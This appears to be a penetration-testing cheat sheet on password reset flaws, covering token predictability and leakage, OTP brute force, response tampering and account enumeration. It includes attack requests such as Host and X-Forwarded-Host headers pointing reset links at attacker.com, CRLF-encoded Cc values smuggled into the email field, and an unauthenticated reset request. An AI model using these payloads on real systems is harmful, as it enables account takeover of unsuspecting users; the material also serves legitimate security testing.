# Password Reset Vulnerabilities

## Overview
Flaws in password reset flows that lead to account takeover without knowing the original password.

## Token-Based Reset Attacks

### Token Predictability
```
# Check if token is based on:
- Timestamp: token = md5(timestamp)
- Username: token = md5(email)
- Sequential: abc123, abc124, abc125
- Weak random: short token, small charset

# Test: request reset multiple times, compare tokens
# Use Burp Sequencer to analyze token entropy
```

### Token Leakage
```
# Token in Referer header
# User clicks link → browser sends Referer to analytics/third-party
# Token leaked to external party

# Token in URL parameters (visible in logs, history)
# Prefer tokens in POST body or headers

# Token in response body without redirect
# Token printed in confirmation email headers
```

### Token Not Expiring
```
# Test: request reset, wait 24h, use old token
# Test: reset password successfully, try old token again
# Test: multiple simultaneous valid tokens
```

### Host Header Injection in Reset Link
```
# If reset email contains: https://HOST/reset?token=X
# Inject Host header to change where link points

POST /forgot-password
Host: attacker.com

# Or:
Host: target.com
X-Forwarded-Host: attacker.com

# Victim receives email: https://attacker.com/reset?token=REAL_TOKEN
# Attacker captures token
```

### Victim Email Manipulation
```
# Change email parameter after request
POST /forgot-password
email=victim@target.com → email=attacker@target.com

# Parameter pollution
email=victim@target.com&email=attacker@target.com
email[]=victim@target.com&email[]=attacker@target.com

# Carbon copy
email=victim@target.com%0aCc:attacker@target.com
email=victim@target.com%0d%0aCc:attacker@target.com
```

## OTP/Code-Based Reset Attacks

### Brute Force OTP
```
# 4-digit: 0000-9999 = 10,000 attempts
# 6-digit: 000000-999999 = 1,000,000 attempts
# Test rate limiting (see rate_limit_bypass.md)

# Common weak OTPs: 0000, 1111, 1234, 123456
# Check if OTP is same as account creation OTP

# Send OTP to attacker, check if same pattern as victim
```

### OTP Not Invalidated
```
# Request new OTP → old OTP still valid
# Use expired OTP
# OTP valid for too long (> 10 minutes)
```

### Response Manipulation
```
# Change response from {"success":false} to {"success":true}
# Change "valid":false to "valid":true
# Intercept and modify status codes: 401 → 200

# If client-side OTP validation
# Find validation logic in JS and bypass
```

## Account Enumeration via Reset
```
# Different messages for valid/invalid accounts
"Email sent" vs "Email not found"
200 OK vs 404 Not Found
Response time difference

# Always test timing: valid email faster/slower than invalid
```

## Pre-Account Takeover
```
# Register attacker@gmail.com
# Victim tries to register same email later via OAuth
# Account merge without ownership verification
# Victim now shares account with attacker

# Attack flow:
1. Attacker registers with victim's email (if no verification required)
2. Victim later registers via OAuth/SSO with same email
3. Server merges accounts → attacker has access
```

## Reset via Security Questions
```
# Common weak questions: mother's maiden name, pet name, city
# OSINT to find answers (LinkedIn, Facebook, public records)
# Brute force short answers
```

## Password Reset via API Misuse
```
# Test direct reset without token
POST /api/users/1/reset-password
{"newPassword":"attacker123"}

# Missing authorization check on reset endpoint
# IDOR: change userId parameter to target another user
```

## Testing Methodology
1. Initiate password reset for your own account
2. Analyze token: length, charset, entropy (Burp Sequencer)
3. Test host header injection
4. Test email parameter manipulation
5. Test OTP brute force (with rate limit bypass)
6. Test token expiry and reuse
7. Test response manipulation
8. Test for account enumeration
9. Check for pre-account takeover scenario

## Impact
- Account takeover without user interaction
- Mass account takeover if token is predictable
